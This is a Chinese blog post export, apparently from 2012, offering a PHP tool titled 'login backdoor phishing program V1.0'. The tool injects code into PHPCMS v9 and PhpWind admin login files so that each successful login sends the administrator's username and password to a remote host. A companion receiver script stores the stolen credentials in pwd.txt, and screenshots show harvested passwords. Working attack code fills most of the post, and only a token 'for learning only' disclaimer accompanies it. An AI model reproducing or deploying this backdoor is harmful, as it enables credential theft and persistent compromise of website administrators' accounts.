class=\"string\">''</span>){</div><div class=\"line\"> <span class=\"variable\">$webRoot</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'DOCUMENT_ROOT'</span>]; <span class=\"comment\">//当前目录</span></div><div class=\"line\"> <span class=\"variable\">$dir</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cms</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cmsCode</span> = switchCms(<span class=\"variable\">$_POST</span>[<span class=\"string\">'cms'</span>]);</div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>(<span class=\"variable\">$cmsCode</span>)){</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"string\">'没找到可用CMS或者BBS'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$relPath</span> = <span class=\"variable\">$webRoot</span>.<span class=\"variable\">$dir</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'path'</span>];</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_exists(<span class=\"variable\">$relPath</span>)){</div><div class=\"line\"> inSertPwdDoor(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'没有找到该文件路径：'</span>.<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> }</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div><div class=\"line\">&lt;!DOCTYPE html <span class=\"keyword\">PUBLIC</span> &quot;-<span class=\"comment\">//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span></div><div class=\"line\">&lt;html xmlns=&quot;http:<span class=\"comment\">//www.w3.org/1999/xhtml&quot;&gt;</span></div><div class=\"line\">&lt;head&gt;</div><div class=\"line\">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-<span class=\"number\">8</span>&quot; /&gt;</div><div class=\"line\">&lt;title&gt;自动插入语句&lt;/title&gt;</div><div class=\"line\">&lt;style type=&quot;text/css&quot;&gt;</div><div class=\"line\">*{</div><div class=\"line\">font-size:<span class=\"number\">14</span>px;</div><div class=\"line\">line-height:<span class=\"number\">20</span>px;</div><div class=\"line\">}</div><div class=\"line\">div{</div><div class=\"line\"> width:<span class=\"number\">450</span>px;</div><div class=\"line\"> margin: <span class=\"number\">0</span>px auto;</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\">&lt;/style&gt;</div><div class=\"line\">&lt;/head&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;body&gt;</div><div class=\"line\">&lt;div style=&quot;width:<span class=\"number\">600</span>px;margin: <span class=\"number\">0</span>px auto;padding-top: <span class=\"number\">50</span>px;padding-bottom: <span class=\"number\">50</span>px; border: <span class=\"number\">1</span>px <span class=\"comment\">#fff012 solid;&quot;&gt;</span></div><div class=\"line\">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V1<span class=\"number\">.0</span> &lt;/h2&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> 当前文件路径：&lt;?php <span class=\"keyword\">echo</span> <span class=\"keyword\">__FILE__</span>?&gt;&lt;br/&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;</div><div class=\"line\"> &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label <span class=\"keyword\">for</span>=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"></div><div class=\"line\"> &lt;div&gt;</div><div class=\"line\"> &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;</div><div class=\"line\"> &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;</div><div class=\"line\"> &lt;/div&gt;</div><div class=\"line\"> &lt;div style=&quot;text-align: left; color: red; margin-top:<span class=\"number\">20</span>px;&quot;&gt;消息：&lt;?php <span class=\"keyword\">echo</span> <span class=\"variable\">$error</span>;?&gt;&lt;/div&gt;</div><div class=\"line\">&lt;/form&gt;</div><div class=\"line\">&lt;/div&gt;</div><div class=\"line\">&lt;/body&gt;</div><div class=\"line\">&lt;/html&gt;</div></pre></td></tr></table></figure>\n\n<p><a id=\"more\"></a><br>接收端：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"variable\">$pwd</span> = <span class=\"string\">'pwd.txt'</span>;</div><div class=\"line\"><span class=\"variable\">$content</span> = @file_get_contents(<span class=\"variable\">$pwd</span>).&quot;n Uname:&quot;.<span class=\"variable\">$_GET</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">' Pwd:'</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">'pwd'</span>];</div><div class=\"line\">file_put_contents(<span class=\"variable\">$pwd</span>, <span class=\"variable\">$content</span>);</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure>\n\n<p>大家可以看到接收端是比较简陋的，因为瞌睡了，就先写个简单的接收端，后面继续完善。</p>\n<p>接收端接收到的密码会自动保存到接收端下面的pwd.txt文件中。</p>\n<p>看看截图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/d1.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/d1.png\" alt=\"\" title=\"d1\"></a></p>\n<p>自动插入后门(PHPcmsV9)截图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/d2.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/d2.png\" alt=\"\" title=\"d2\"></a></p>\n<p>接收到的密码：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/07/d3.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/07/d3.png\" alt=\"\" title=\"d3\"></a></p>\n<p>&nbsp;</p>\n<p>好了，本程序代码仅供学习参考，请勿非法用途！负责后果自负~</p>\n","source":"_posts/登录后门钓鱼程序-v1-0.md","raw":"title: \"登录后门钓鱼程序 V1.0\"\nid: 99\ndate: 2012-07-03 01:32:15\ntags: \n- 后门\n- 钓鱼\ncategories: \n- 原创作品\n- 技术文章\n---\n\n现在的各大cms也好bbs也好。对于用户的加密方式已经不仅仅局限于md5(密码)了。大家都知道一次md5加密的密码，\n\n如果系统一旦有注入漏洞被获取到加密后的密码通过一些付费或者免费的网站是完全可以破解密码的，而现在那些主流\n\ncms或者bbs加密方式越来月多样化了，导致即使拿到管理员数据库中的加密密码也没用了，所有就有了这个程序。\n\n先上代码：\n\n程序端:\n\n```php\n<?php\n/**\n +-----------------------------------------------------------------\n * 登录后门钓鱼程序 V1.0\n +-----------------------------------------------------------------\n * 功能介绍：\n * 本程序会根据所选cms和BBS系统自动插入钓鱼后门\n * 后续将完善支持PHP的主流的cms和bbs系统\n * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息\n +-----------------------------------------------------------------\n * 作者： Return Blogs: www.creturn.com\n +-----------------------------------------------------------------\n **/\nerror_reporting(0);\n$rHost = 'http://192.168.1.199/MyProject/server/sever.php'; //定义接收地址\n$pUname = 'uname'; //远程端接收用户名参数\n$pPwd = 'pwd'; //定义远程接收密码参数\n$error = '';\n/**\n * 插入代码\n */\nfunction inSertPwdDoor($cmsCode,$relPath){\n global $rHost,$pUname,$pPwd;\n //读取用户名密码特制\n if($cmsCode['mothed'] == 'post'){\n $rHostPath = $rHost.'?'.$pUname.'=$_POST['.$cmsCode['uname'].']&amp;'.$pPwd.'=$_POST['.$cmsCode['pwd'].']';\n }else{\n $rHostPath = $rHost.'?'.$pUname.'=$_GET['.$cmsCode['uname'].']&amp;'.$pPwd.'=$_GET['.$cmsCode['pwd'].']';\n }\n //获取插入代码\n $keyword = $cmsCode['keyword'];\n $replace = 'file_get_contents(&quot;'.$rHostPath.'&quot;);'.$cmsCode['bedeck'].$keyword;\n $loginPageContent = file_get_contents($relPath);\n $loginPageContent = str_replace($keyword, $replace, $loginPageContent);\n if(file_put_contents($relPath, $loginPageContent)){\n tipAmessage('成功插入！');\n }else{\n tipAmessage('插入失败！');\n }\n}\n\nfunction tipAmessage($msg){\n global $error;\n $error = $msg;\n}\n/**\n * 各类cms登录标识码和文件路径\n *\n * $code说明：\n * $code['keyword'] 关键字，就是要插入代码的特征码\n * $code['bedeck'] 修饰符用来修正代码的外观\n * $code['uname'] 用户名变量名\n * $code['pwd'] 密码变量名\n * $code['mothed'] 密码提交方式：POST 或者 GET\n * $code['path'] 登录文件路径\n * 注意事项：\n * 由于登录口不同程序可能有多个登录方法，正常登录\n * 或者ajax或者第三方登录，所以登录点的关键词必须找准\n */\nfunction switchCms($cmsName){\n $code = array();\n switch ($cmsName) {\n case 'phpcmsV9':\n $code['path'] = 'phpcms/modules/admin/index.php';\n $code['keyword'] = &quot;showmessage(L('login_success'),'?m=admin&amp;c=index');&quot;;\n $code['bedeck'] = &quot;nttt&quot;;\n $code['uname'] = 'username';\n $code['pwd'] = 'password';\n $code['mothed'] = 'post';\n break;\n case 'phpwind':\n $code['path'] = 'admin/admincp.php';\n $code['keyword'] = &quot;$REQUEST_URI = trim($REQUEST_URI,'?#');&quot;;\n $code['bedeck'] = &quot;nt&quot;;\n $code['uname'] = 'admin_name';\n $code['pwd'] = 'admin_pwd';\n $code['mothed'] = 'post';\n break;\n }\n return $code;\n\n}\nif(isset($_POST['creack']) &amp;&amp; $_POST['creack'] != ''){\n $webRoot = $_SERVER['DOCUMENT_ROOT']; //当前目录\n $dir = isset($_POST['dir']) &amp;&amp; !empty($_POST['dir']) ? trim($_POST['dir']) : '';\n $cms = isset($_POST['cms']) &amp;&amp; !empty($_POST['cms']) ? trim($_POST['cms']) : '';\n $cmsCode = switchCms($_POST['cms']);\n if(empty($cmsCode)){\n $error = '没找到可用CMS或者BBS';\n }else{\n $relPath = $webRoot.$dir.$cmsCode['path'];\n if(file_exists($relPath)){\n inSertPwdDoor($cmsCode,$relPath);\n }else{\n tipAmessage('没有找到该文件路径：'.$relPath);\n }\n }\n}\n?>\n&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;\n&lt;head&gt;\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;\n&lt;title&gt;自动插入语句&lt;/title&gt;\n&lt;style type=&quot;text/css&quot;&gt;\n*{\nfont-size:14px;\nline-height:20px;\n}\ndiv{\n width:450px;\n margin: 0px auto;\n}\n\n&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;div style=&quot;width:600px;margin: 0px auto;padding-top: 50px;padding-bottom: 50px; border: 1px #fff012 solid;&quot;&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n &lt;div&gt;\n &lt;h2 style=&quot;text-align: center;&quot;&gt;登录后门钓鱼程序 V1.0 &lt;/h2&gt;\n &lt;/div&gt;\n &lt;div&gt;\n &lt;h4 style=&quot;color: red&quot;&gt;注意：Path参数，默认根目录不用填写，如果目标程序在子目录中请填入路径&lt;/h4&gt;\n &lt;/div&gt;\n &lt;div&gt;\n 当前文件路径：&lt;?php echo __FILE__?&gt;&lt;br/&gt;\n &lt;/div&gt;\n &lt;div&gt;\n &lt;input type=&quot;radio&quot; value=&quot;dz&quot; name=&quot;cms&quot; id=&quot;dzcms&quot; /&gt;&lt;label for=&quot;dzcms&quot;&gt;Discuz&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;phpwind&quot; name=&quot;cms&quot; id=&quot;phpwind&quot; /&gt;&lt;label for=&quot;phpwind&quot;&gt;PhpWind&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;phpcmsV9&quot; name=&quot;cms&quot; id=&quot;v9cms&quot; /&gt;&lt;label for=&quot;v9cms&quot;&gt;PHPCMSv9&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;dedecms&quot; name=&quot;cms&quot; id=&quot;dedecms&quot; /&gt;&lt;label for=&quot;dedecms&quot;&gt;DedeCms&lt;/label&gt;\n &lt;input type=&quot;radio&quot; value=&quot;wordpress&quot; name=&quot;cms&quot; id=&quot;wrodpress&quot; /&gt;&lt;label for=&quot;wrodpress&quot;&gt;WordPress&lt;/label&gt;\n &lt;/div&gt;\n\n &lt;div&gt;\n &lt;span&gt;Path:&lt;/span&gt;&lt;/span&gt;&lt;input type=&quot;text&quot; name=&quot;dir&quot; /&gt;\n &lt;input type=&quot;submit&quot; name=&quot;creack&quot; value=&quot;插入后门&quot; /&gt;\n &lt;/div&gt;\n &lt;div style=&quot;text-align: left; color: red; margin-top:20px;&quot;&gt;消息：&lt;?php echo $error;?&gt;&lt;/div&gt;\n&lt;/form&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n```\n<!--more-->\n接收端：\n\n```php\n<?php\n$pwd = 'pwd.txt';\n$content = @file_get_contents($pwd).&quot;n Uname:&quot;.$_GET['uname'].' Pwd:'.$_GET['pwd'];\nfile_put_contents($pwd, $content);\n?&gt;\n\n```\n\n\n大家可以看到接收端是比较简陋的，因为瞌睡了，就先写个简单的接收端，后面继续完善。\n\n接收端接收到的密码会自动保存到接收端下面的pwd.txt文件中。\n\n看看截图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/d1.png \"d1\")](http://asset.creturn.com/asset/uploads/2012/07/d1.png)\n\n自动插入后门(PHPcmsV9)截图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/d2.png \"d2\")](http://asset.creturn.com/asset/uploads/2012/07/d2.png)\n\n接收到的密码：\n\n[![](http://asset.creturn.com/asset/uploads/2012/07/d3.png \"d3\")](http://asset.creturn.com/asset/uploads/2012/07/d3.png)\n\n&nbsp;\n\n好了，本程序代码仅供学习参考，请勿非法用途！负责后果自负~\n","slug":"登录后门钓鱼程序-v1-0","updated":1421659126000,"excerpt":"<p>现在的各大cms也好bbs也好。对于用户的加密方式已经不仅仅局限于md5(密码)了。大家都知道一次md5加密的密码，</p>\n<p>如果系统一旦有注入漏洞被获取到加密后的密码通过一些付费或者免费的网站是完全可以破解密码的，而现在那些主流</p>\n<p>cms或者bbs加密方式越来月多样化了，导致即使拿到管理员数据库中的加密密码也没用了，所有就有了这个程序。</p>\n<p>先上代码：</p>\n<p>程序端:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 登录后门钓鱼程序 V1.0</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 功能介绍：</div><div class=\"line\"> * 本程序会根据所选cms和BBS系统自动插入钓鱼后门</div><div class=\"line\"> * 后续将完善支持PHP的主流的cms和bbs系统</div><div class=\"line\"> * 本程序仅供学习参考，请勿非法用途 ，请保留版权信息</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> * 作者： Return Blogs: www.creturn.com</div><div class=\"line\"> +-----------------------------------------------------------------</div><div class=\"line\"> **/</div><div class=\"line\">error_reporting(<span class=\"number\">0</span>);</div><div class=\"line\"><span class=\"variable\">$rHost</span> = <span class=\"string\">'http://192.168.1.199/MyProject/server/sever.php'</span>; <span class=\"comment\">//定义接收地址</span></div><div class=\"line\"><span class=\"variable\">$pUname</span> = <span class=\"string\">'uname'</span>; <span class=\"comment\">//远程端接收用户名参数</span></div><div class=\"line\"><span class=\"variable\">$pPwd</span> = <span class=\"string\">'pwd'</span>; <span class=\"comment\">//定义远程接收密码参数</span></div><div class=\"line\"><span class=\"variable\">$error</span> = <span class=\"string\">''</span>;</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 插入代码</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inSertPwdDoor</span><span class=\"params\">(<span class=\"variable\">$cmsCode</span>,<span class=\"variable\">$relPath</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$rHost</span>,<span class=\"variable\">$pUname</span>,<span class=\"variable\">$pPwd</span>;</div><div class=\"line\"> <span class=\"comment\">//读取用户名密码特制</span></div><div class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'mothed'</span>] == <span class=\"string\">'post'</span>){</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_POST['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> <span class=\"variable\">$rHostPath</span> = <span class=\"variable\">$rHost</span>.<span class=\"string\">'?'</span>.<span class=\"variable\">$pUname</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'uname'</span>].<span class=\"string\">']&amp;'</span>.<span class=\"variable\">$pPwd</span>.<span class=\"string\">'=$_GET['</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'pwd'</span>].<span class=\"string\">']'</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"comment\">//获取插入代码</span></div><div class=\"line\"> <span class=\"variable\">$keyword</span> = <span class=\"variable\">$cmsCode</span>[<span class=\"string\">'keyword'</span>];</div><div class=\"line\"> <span class=\"variable\">$replace</span> = <span class=\"string\">'file_get_contents(&quot;'</span>.<span class=\"variable\">$rHostPath</span>.<span class=\"string\">'&quot;);'</span>.<span class=\"variable\">$cmsCode</span>[<span class=\"string\">'bedeck'</span>].<span class=\"variable\">$keyword</span>;</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = file_get_contents(<span class=\"variable\">$relPath</span>);</div><div class=\"line\"> <span class=\"variable\">$loginPageContent</span> = str_replace(<span class=\"variable\">$keyword</span>, <span class=\"variable\">$replace</span>, <span class=\"variable\">$loginPageContent</span>);</div><div class=\"line\"> <span class=\"keyword\">if</span>(file_put_contents(<span class=\"variable\">$relPath</span>, <span class=\"variable\">$loginPageContent</span>)){</div><div class=\"line\"> tipAmessage(<span class=\"string\">'成功插入！'</span>);</div><div class=\"line\"> }<span class=\"keyword\">else</span>{</div><div class=\"line\"> tipAmessage(<span class=\"string\">'插入失败！'</span>);</div><div class=\"line\"> }</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">tipAmessage</span><span class=\"params\">(<span class=\"variable\">$msg</span>)</span></span>{</div><div class=\"line\"> <span class=\"keyword\">global</span> <span class=\"variable\">$error</span>;</div><div class=\"line\"> <span class=\"variable\">$error</span> = <span class=\"variable\">$msg</span>;</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"> * 各类cms登录标识码和文件路径</div><div class=\"line\"> *</div><div class=\"line\"> * $code说明：</div><div class=\"line\"> * $code['keyword'] 关键字，就是要插入代码的特征码</div><div class=\"line\"> * $code['bedeck'] 修饰符用来修正代码的外观</div><div class=\"line\"> * $code['uname'] 用户名变量名</div><div class=\"line\"> * $code['pwd'] 密码变量名</div><div class=\"line\"> * $code['mothed'] 密码提交方式：POST 或者 GET</div><div class=\"line\"> * $code['path'] 登录文件路径</div><div class=\"line\"> * 注意事项：</div><div class=\"line\"> * 由于登录口不同程序可能有多个登录方法，正常登录</div><div class=\"line\"> * 或者ajax或者第三方登录，所以登录点的关键词必须找准</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">switchCms</span><span class=\"params\">(<span class=\"variable\">$cmsName</span>)</span></span>{</div><div class=\"line\"> <span class=\"variable\">$code</span> = <span class=\"keyword\">array</span>();</div><div class=\"line\"> <span class=\"keyword\">switch</span> (<span class=\"variable\">$cmsName</span>) {</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpcmsV9'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'phpcms/modules/admin/index.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;showmessage(L(<span class=\"string\">'login_success'</span>),<span class=\"string\">'?m=admin&amp;c=index'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nttt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'username'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'password'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> <span class=\"keyword\">case</span> <span class=\"string\">'phpwind'</span>:</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'path'</span>] = <span class=\"string\">'admin/admincp.php'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'keyword'</span>] = &quot;<span class=\"variable\">$REQUEST_URI</span> = trim(<span class=\"variable\">$REQUEST_URI</span>,<span class=\"string\">'?#'</span>);&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'bedeck'</span>] = &quot;nt&quot;;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'uname'</span>] = <span class=\"string\">'admin_name'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'pwd'</span>] = <span class=\"string\">'admin_pwd'</span>;</div><div class=\"line\"> <span class=\"variable\">$code</span>[<span class=\"string\">'mothed'</span>] = <span class=\"string\">'post'</span>;</div><div class=\"line\"> <span class=\"keyword\">break</span>;</div><div class=\"line\"> }</div><div class=\"line\"> <span class=\"keyword\">return</span> <span class=\"variable\">$code</span>;</div><div class=\"line\"></div><div class=\"line\">}</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>]) &amp;&amp; <span class=\"variable\">$_POST</span>[<span class=\"string\">'creack'</span>] != <span class=\"string\">''</span>){</div><div class=\"line\"> <span class=\"variable\">$webRoot</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'DOCUMENT_ROOT'</span>]; <span class=\"comment\">//当前目录</span></div><div class=\"line\"> <span class=\"variable\">$dir</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) ? trim(<span class=\"variable\">$_POST</span>[<span class=\"string\">'dir'</span>]) : <span class=\"string\">''</span>;</div><div class=\"line\"> <span class=\"variable\">$cms</span> = <span class=\"keyword\">isset</span>(<span 